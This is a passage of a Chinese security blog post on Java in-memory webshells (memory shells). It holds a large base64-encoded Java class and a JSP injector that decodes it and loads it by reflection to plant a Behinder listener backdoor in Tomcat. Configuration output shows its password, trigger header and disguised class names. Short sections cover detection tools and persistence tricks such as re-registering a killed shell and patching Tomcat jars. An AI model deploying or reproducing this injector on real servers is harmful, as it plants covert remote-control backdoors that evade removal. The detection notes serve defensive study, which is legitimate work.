T2JqZWN0O0xqYXZhL2xhbmcvT2JqZWN0OylWDABCAEMKAAIARAEABGtleTEBAAhjaGlsZHJlbgEAE0xqYXZhL3V0aWwvSGFzaE1hcDsBAANrZXkBAAtjaGlsZHJlbk1hcAEABnRocmVhZAEAEkxqYXZhL2xhbmcvVGhyZWFkOwEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAd0aHJlYWRzAQATW0xqYXZhL2xhbmcvVGhyZWFkOwcAUAEAEGphdmEvbGFuZy9UaHJlYWQHAFIBABFqYXZhL3V0aWwvSGFzaE1hcAcAVAEAE2phdmEvdXRpbC9BcnJheUxpc3QHAFYKAFcAKQEACmdldFRocmVhZHMIAFkBAAxpbnZva2VNZXRob2QBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvT2JqZWN0OwwAWwBcCgACAF0BAAdnZXROYW1lDABfAAYKAFMAYAEAHENvbnRhaW5lckJhY2tncm91bmRQcm9jZXNzb3IIAGIBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgwAZABlCgAPAGYBAAZ0YXJnZXQIAGgBAAVnZXRGVgwAagBcCgACAGsBAAZ0aGlzJDAIAG0IAEcBAAZrZXlTZXQBABEoKUxqYXZhL3V0aWwvU2V0OwwAcABxCgBVAHIBAA1qYXZhL3V0aWwvU2V0BwB0CwB1ADQBAANnZXQMAHcAPwoAVQB4AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7DAB6AHsKAAQAfAEAD2phdmEvbGFuZy9DbGFzcwcAfgoAfwBgAQAPU3RhbmRhcmRDb250ZXh0CACBAQADYWRkAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaDACDAIQLACUAhQEAFVRvbWNhdEVtYmVkZGVkQ29udGV4dAgAhwEAFWdldENvbnRleHRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsMAIkAigoAUwCLAQAIdG9TdHJpbmcMAI0ABgoAfwCOAQAZUGFyYWxsZWxXZWJhcHBDbGFzc0xvYWRlcggAkAEAH1RvbWNhdEVtYmVkZGVkV2ViYXBwQ2xhc3NMb2FkZXIIAJIBAAlyZXNvdXJjZXMIAJQIAB0BABpqYXZhL2xhbmcvUnVudGltZUV4Y2VwdGlvbgcAlwEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgwAEgCZCgCYAJoBACBqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbgcAnAEAH2phdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb24HAJ4BACtqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY2F0aW9uVGFyZ2V0RXhjZXB0aW9uBwCgAQAJU2lnbmF0dXJlAQAmKClMamF2YS91dGlsL0xpc3Q8TGphdmEvbGFuZy9PYmplY3Q7PjsBABNqYXZhL2xhbmcvVGhyb3dhYmxlBwCkAQAJY2xhenpCeXRlAQACW0IBAAtkZWZpbmVDbGFzcwEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAFY2xhenoBABFMamF2YS9sYW5nL0NsYXNzOwEAC2NsYXNzTG9hZGVyAQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIHAK4BAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsMALAAsQoAUwCyAQAOZ2V0Q2xhc3NMb2FkZXIMALQAigoAfwC1DAAFAAYKAAIAtwEACWxvYWRDbGFzcwEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsMALkAugoArwC7AQALbmV3SW5zdGFuY2UMAL0AOwoAfwC+DAAKAAYKAAIAwAEADGRlY29kZUJhc2U2NAEAFihMamF2YS9sYW5nL1N0cmluZzspW0IMAMIAwwoAAgDEAQAOZ3ppcERlY29tcHJlc3MBAAYoW0IpW0IMAMYAxwoAAgDICACoBwCnAQARamF2YS9sYW5nL0ludGVnZXIHAMwBAARUWVBFDADOAKsJAM0AzwEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwwA0QDSCgB/ANMBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QHANUBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgwA1wDYCgDWANkBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwwA2wDcCgDNAN0BAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMAN8A4AoA1gDhAQAHb2JqZWN0cwEAE1tMamF2YS9sYW5nL09iamVjdDsBAAlsaXN0ZW5lcnMBAAlhcnJheUxpc3QBABVMamF2YS91dGlsL0FycmF5TGlzdDsBAAppc0luamVjdGVkAQAnKExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylaDADoAOkKAAIA6gEAG2FkZEFwcGxpY2F0aW9uRXZlbnRMaXN0ZW5lcggA7AEAXShMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzcztbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwAWwDuCgACAO8BABxnZXRBcHBsaWNhdGlvbkV2ZW50TGlzdGVuZXJzCADxBwDkAQAQamF2YS91dGlsL0FycmF5cwcA9AEABmFzTGlzdAEAJShbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL3V0aWwvTGlzdDsMAPYA9woA9QD4AQAZKExqYXZhL3V0aWwvQ29sbGVjdGlvbjspVgwAEgD6CgBXAPsKAFcAhQEAHHNldEFwcGxpY2F0aW9uRXZlbnRMaXN0ZW5lcnMIAP4BAAd0b0FycmF5AQAVKClbTGphdmEvbGFuZy9PYmplY3Q7DAEAAQEKAFcBAgEAAWkBAAFJAQANZXZpbENsYXNzTmFtZQEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABHNpemUBAAMoKUkMAQgBCQoAVwEKAQAVKEkpTGphdmEvbGFuZy9PYmplY3Q7DAB3AQwKAFcBDQEADGRlY29kZXJDbGFzcwEAB2RlY29kZXIBAAdpZ25vcmVkAQAJYmFzZTY0U3RyAQAUTGphdmEvbGFuZy9DbGFzczwqPjsBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyCAEUAQAHZm9yTmFtZQwBFgC6CgB/ARcBAAxkZWNvZGVCdWZmZXIIARkBAAlnZXRNZXRob2QMARsA0goAfwEcAQAQamF2YS51dGlsLkJhc2U2NAgBHgEACmdldERlY29kZXIIASABAAZkZWNvZGUIASIBACBqYXZhL2xhbmcvQ2xhc3NOb3RGb3VuZEV4Y2VwdGlvbgcBJAEADmNvbXByZXNzZWREYXRhAQADb3V0AQAfTGphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtOwEAAmluAQAeTGphdmEvaW8vQnl0ZUFycmF5SW5wdXRTdHJlYW07AQAGdW5nemlwAQAfTGphdmEvdXRpbC96aXAvR1pJUElucHV0U3RyZWFtOwEABmJ1ZmZlcgEAAW4BAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQcBLwEAHGphdmEvaW8vQnl0ZUFycmF5SW5wdXRTdHJlYW0HATEBAB1qYXZhL3V0aWwvemlwL0daSVBJbnB1dFN0cmVhbQcBMwoBMAApAQAFKFtCKVYMABIBNgoBMgE3AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWDAASATkKATQBOgEABHJlYWQBAAUoW0IpSQwBPAE9CgE0AT4BAAV3cml0ZQEAByhbQklJKVYMAUABQQoBMAFCAQALdG9CeXRlQXJyYXkBAAQoKVtCDAFEAUUKATABRgEAA29iagEACWZpZWxkTmFtZQEABWZpZWxkAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEABGdldEYBAD8oTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsMAUwBTQoAAgFOAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQHAVAKAVEA2QoBUQB4AQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uBwFUAQAgTGphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbjsBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7DAFXAVgKAH8BWQEADWdldFN1cGVyY2xhc3MMAVsAewoAfwFcCgFVABQBAAx0YXJnZXRPYmplY3QBAAptZXRob2ROYW1lAQAH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&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] bytecode = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">base64Clz</span> <span class="operator">=</span> classLoader.loadClass(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">            <span class="type">Class</span> <span class="variable">decoderClz</span> <span class="operator">=</span> classLoader.loadClass(<span class="string">&quot;java.util.Base64$Decoder&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> base64Clz.getMethod(<span class="string">&quot;getDecoder&quot;</span>).invoke(base64Clz);</span><br><span class="line">            bytecode = (<span class="type">byte</span>[]) decoderClz.getMethod(<span class="string">&quot;decode&quot;</span>, String.class).invoke(decoder, bytecodeBase64);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException ee) &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">datatypeConverterClz</span> <span class="operator">=</span> classLoader.loadClass(<span class="string">&quot;javax.xml.bind.DatatypeConverter&quot;</span>);</span><br><span class="line">            bytecode = (<span class="type">byte</span>[]) datatypeConverterClz.getMethod(<span class="string">&quot;parseBase64Binary&quot;</span>, String.class).invoke(datatypeConverterClz, bytecodeBase64);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> (Class)defineClass.invoke(classLoader,bytecode,<span class="number">0</span>,bytecode.length);</span><br><span class="line">        clazz.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>访问后成功添加</p>
+<p>​<img src="https://aiyakami.github.io/about/12/network-asset-asynccode-20250412220812-yxl4fdm.png">​</p>
+<p>相关配置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[&gt;] Behinder Tomcat Listener JSP</span><br><span class="line"></span><br><span class="line">[+] 基础信息:</span><br><span class="line"></span><br><span class="line">密码: Aoxpcply</span><br><span class="line">请求路径: /*</span><br><span class="line">请求头: Referer: Jlwvndc</span><br><span class="line">脚本类型: JSP</span><br><span class="line">内存马类名: org.junit.ServletRequestFezjListener</span><br><span class="line">注入器类名: org.apache.commons.lang.n.ThreadUtil</span><br></pre></td></tr></table></figure>
+
+<p>成功连接</p>
+<p>​<img src="https://aiyakami.github.io/about/12/network-asset-asynccode-20250412220813-lihlcsi.png">​</p>
+<h3 id="Spring类型内存马"><a href="#Spring类型内存马" class="headerlink" title="Spring类型内存马"></a>Spring类型内存马</h3><p>基于spring框架处理组件的内存马，通常包括Controller型，Interceptor型</p>
+<h3 id="Java-Agent内存马"><a href="#Java-Agent内存马" class="headerlink" title="Java Agent内存马"></a>Java Agent内存马</h3><p>以java agent形式存在的内存马</p>
+<h3 id="内存马的查杀"><a href="#内存马的查杀" class="headerlink" title="内存马的查杀"></a>内存马的查杀</h3><h4 id="基于文件是否落地"><a href="#基于文件是否落地" class="headerlink" title="基于文件是否落地"></a>基于文件是否落地</h4><p>使用tomcat-memshell-scanner能成功根据无class文件进行判断，不过后续执行要创建对应的class文件的话应该还算比较好绕过</p>
+<p>​<img src="https://aiyakami.github.io/about/12/network-asset-asynccode-20250412220813-qp4qzsq.png">​</p>
+<h4 id="基于arthas内容分析"><a href="#基于arthas内容分析" class="headerlink" title="基于arthas内容分析"></a>基于arthas内容分析</h4><p>根据继承实现类黑名单，注解包名类名等黑名单来做，这部分可以使用阿里的java诊断工具arthas去分析</p>
+<h3 id="内存马的持久化手段"><a href="#内存马的持久化手段" class="headerlink" title="内存马的持久化手段"></a>内存马的持久化手段</h3><h4 id="被杀复原"><a href="#被杀复原" class="headerlink" title="被杀复原"></a>被杀复原</h4><p>在相关组件的destroy方法中加入再注册内存马的代码</p>
+<p>另起一个线程用于循环检测内存马是否被杀，被杀时继续添加</p>
+<h4 id="重启生效"><a href="#重启生效" class="headerlink" title="重启生效"></a>重启生效</h4><p>须往本地写文件，可以利用addShutDownHook方法在JVM退出时写文件</p>
+<p>写入依赖Jar中，例如catalina.jar中</p>
+<p>修改Tomcat的Lib也是一种手段，在默认开启的WsFilter中的doFilter方法中修改代码</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+
+    </footer>
+  </div>
+  
+    
+  <nav id="article-nav" data-aos="fade-up">
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/covers/4.jpg" data-sizes="auto" alt="反序列化payload缩小技术" class="lazyload">
+        
+      
+      <a href="/2025/04/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96payload%E7%BC%A9%E5%B0%8F%E6%8A%80%E6%9C%AFoutput/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          反序列化payload缩小技术
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+  
+</article>
+
+
+
+
+
+
+</section>
+          
+            <aside id="sidebar">
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0"><span class="toc-number">1.</span> <span class="toc-text">内存马的一些学习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-EE%E6%9E%B6%E6%9E%84%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.0.1.</span> <span class="toc-text">Java EE架构内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#filter%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.0.1.1.</span> <span class="toc-text">filter内存马</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Listener%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.0.1.2.</span> <span class="toc-text">Listener内存马</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Spring%E7%B1%BB%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.0.2.</span> <span class="toc-text">Spring类型内存马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.0.3.</span> <span class="toc-text">Java Agent内存马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E6%9F%A5%E6%9D%80"><span class="toc-number">1.0.4.</span> <span class="toc-text">内存马的查杀</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%96%87%E4%BB%B6%E6%98%AF%E5%90%A6%E8%90%BD%E5%9C%B0"><span class="toc-number">1.0.4.1.</span> <span class="toc-text">基于文件是否落地</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8Earthas%E5%86%85%E5%AE%B9%E5%88%86%E6%9E%90"><span class="toc-number">1.0.4.2.</span> <span class="toc-text">基于arthas内容分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E6%8C%81%E4%B9%85%E5%8C%96%E6%89%8B%E6%AE%B5"><span class="toc-number">1.0.5.</span> <span class="toc-text">内存马的持久化手段</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A2%AB%E6%9D%80%E5%A4%8D%E5%8E%9F"><span class="toc-number">1.0.5.1.</span> <span class="toc-text">被杀复原</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%87%8D%E5%90%AF%E7%94%9F%E6%95%88"><span class="toc-number">1.0.5.2.</span> <span class="toc-text">重启生效</span></a></li></ol></li></ol></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="aiyakami" class="lazyload">
+  <div class="sidebar-author-name">aiyakami</div>
+  <div class="sidebar-description">关联B站https://space.bilibili.com/374640673</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">15</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">首页</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">归档</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">关于</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
